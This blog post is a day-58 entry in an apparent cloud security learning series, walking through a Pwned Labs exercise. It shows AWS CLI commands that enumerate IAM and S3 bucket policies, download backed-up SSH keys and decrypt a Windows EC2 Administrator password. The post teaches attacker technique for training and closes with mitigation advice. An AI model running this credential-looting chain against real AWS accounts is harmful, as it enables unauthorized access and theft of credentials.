---
title: '100 Days of Cloud Security - Day 58: PWNED LABS - Leverage Insecure Storage and Backups for Profit - Part 1'
date: '2026-01-06'
author: 'Venkata Pathuri'
excerpt: 'Day 58 of my cloud security journey - PWNED LABS - Leverage Insecure Storage and Backups for Profit - Part 1'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 58: PWNED LABS - Leverage Insecure Storage and Backups for Profit - Part 1

## Overview

Welcome back to Day 58 of our cloud security journey! Today, we delve into the intriguing world of insecure storage and backups, exploring how improper configurations can expose sensitive data to unauthorized access. Building upon the skills we honed in Day 57, where we learned about IAM role management and monitoring AWS resources, we will now put that knowledge to practical use in a simulated environment. This session is not just about identifying vulnerabilities but also about understanding the consequences and how to mitigate them effectively.

## Learning Objectives

By the end of today’s session, you will master key techniques such as enumerating IAM and S3 bucket policies, retrieving sensitive information like Windows administrator passwords, and understanding the risks associated with insecure storage. You will also learn how to extract password hashes from a local database and crack NT hashes, giving you insights into both offensive and defensive security practices. More importantly, you'll gain a comprehensive understanding of how these vulnerabilities could have been prevented.

## Deep Dive

### IAM Policy Enumeration

We begin our exploration by verifying our identity in the AWS environment. This is crucial as it sets the stage for the permissions we can exploit. Using the AWS CLI, you can quickly check your current user identity:

```bash
aws sts get-caller-identity --profile pwl
```

This command returns essential details like `UserId`, `Account`, and `Arn`, helping you confirm which permissions you have access to.

Next, we enumerate the policies attached to our IAM user. This is a critical step to understand the scope of our permissions:

```bash
aws iam list-attached-user-policies --user-name contractor --profile pwl
```

In this case, the user has a policy that allows access to EC2 and S3 actions, specifically `ec2:GetPasswordData` and `s3:GetBucketPolicy`. Understanding these permissions is key, as they guide our next steps.

### S3 Bucket Enumeration & Looting

With permissions in hand, we now turn our attention to potential data sources. We examine the S3 bucket policy for `hl-it-admin`:

```bash
aws s3api get-bucket-policy --bucket hl-it-admin --profile pwl
```

The output reveals that the `contractor` user has read access to a specific file—a perfect target for our exploits. We download the file containing SSH keys, which may grant us further access into the system:

```bash
aws s3 cp s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip . --profile pwl
unzip ssh_keys_backup.zip
```

Upon extracting the contents, we find critical SSH keys, including `it-admin.pem` and `contractor.pem`, which are invaluable for our next steps.

### Instance Reconnaissance

With the SSH keys at our disposal, we need to identify the target Windows instance. Using the EC2 describe-instances command, we can fetch crucial details, including the public IP, which allows us to connect to the instance:

```bash
aws ec2 describe-instances --instance-ids i-04cc1c2c7ec1af1b5
```

From this, we retrieve the public IP: `54.226.75.125`, the platform type (Windows), and the key name, which will be used for accessing the instance.

### Password Retrieval

Now, let's take advantage of our permissions to decrypt the Windows Administrator password using the following command:

```bash
aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --priv-launch-key it-admin.pem
```

The output provides us with the Administrator password, which we can now use to log into the Windows instance.

## Hands-On Practice

To put this theory into practice, follow these steps carefully in your AWS environment:

1. **Verify your user identity:**
   ```bash
   aws sts get-caller-identity --profile pwl
   ```

2. **List attached user policies:**
   ```bash
   aws iam list-attached-user-policies --user-name contractor --profile pwl
   ```

3. **Check the S3 bucket policy:**
   ```bash
   aws s3api get-bucket-policy --bucket hl-it-admin --profile pwl
   ```

4. **Download and unzip the SSH keys:**
   ```bash
   aws s3 cp s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip . --profile pwl
   unzip ssh_keys_backup.zip
   ```

5. **Describe the instance to find the public IP:**
   ```bash
   aws ec2 describe-instances --instance-ids i-04cc1c2c7ec1af1b5
   ```

6. **Retrieve the password data:**
   ```bash
   aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --priv-launch-key it-admin.pem
   ```

**Expected Outcome:** Successful retrieval of sensitive data allowing access to the Windows instance.

**Common Troubleshooting Tips:**
- Ensure your AWS CLI is configured correctly with the right profile.
- Verify that the instance ID and bucket name are correct.
- Check your IAM permissions if you encounter access denied errors.

## Key Takeaways

Today, we learned how insecure storage can be leveraged to uncover sensitive data within AWS environments. By systematically enumerating IAM policies, examining S3 bucket permissions, and successfully extracting sensitive information, you now have a clearer understanding of how attackers think and operate. More importantly, you’ve gained insights into the preventative measures that can be adopted to mitigate these vulnerabilities in real-world environments.

## Real-World Applications

In modern production environments, the principles we practiced today are essential for both offensive and defensive security strategies. Organizations must regularly audit IAM policies and S3 bucket permissions to ensure that sensitive data is not exposed. Implementing least privilege principles, employing encryption for sensitive backups, and conducting routine security assessments are all best practices that can significantly reduce the risk of data breaches.

---

**Journey Progress:** 58/100 Days Complete 🚀